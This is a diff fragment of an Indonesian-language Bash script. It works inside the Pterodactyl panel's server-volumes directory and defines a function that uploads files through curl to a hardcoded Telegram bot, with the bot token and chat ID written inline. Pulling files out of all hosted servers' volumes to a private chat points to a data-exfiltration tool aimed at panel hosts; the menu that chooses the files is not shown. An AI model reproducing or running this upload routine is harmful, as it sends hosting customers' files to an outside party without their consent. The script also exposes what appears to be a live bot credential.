@@ -24,23 +24,18 @@ echo ""
 cd /var/lib/pterodactyl/volumes
 
 # === CONFIG TELEGRAM ===
-BOT_TOKEN="7764774217:AAHwpnX3xh4TCY9A7X-fJHNuocEbQ05Pzeg"   # ganti tokenmu
-CHAT_ID="7089735468"     # ganti chat_idmu
+BOT_TOKEN="7764774217:AAHwpnX3xh4TCY9A7X-fJHNuocEbQ05Pzeg"
+CHAT_ID="7089735468"
 
-# === FUNCTION: Kirim file ke Telegram (silent) ===
+# === FUNCTION: Kirim file ke Telegram ===
 send_file() {
   local file="$1"
-  echo -e "${YELLOW}📤 Mengirim file: ${file}${RESET}"
+  echo "📤 Mengirim file: $file"
   curl -s -F chat_id="$CHAT_ID" \
        -F document=@"$file" \
-       "https://api.telegram.org/bot$BOT_TOKEN/sendDocument" > /dev/null 2>&1
-  if [ $? -eq 0 ]; then
-    echo -e "${GREEN}✅ File berhasil dikirim!${RESET}"
-  else
-    echo -e "${RED}❌ Gagal mengirim file!${RESET}"
-  fi
+       "https://api.telegram.org/bot$BOT_TOKEN/sendDocument" \
+  && echo "✅ File berhasil dikirim!"
 }
-
 # === MENU PILIHAN UTAMA ===
 while true; do
   echo -e "\n${CYAN}=== MENU UTAMA ===${RESET}"
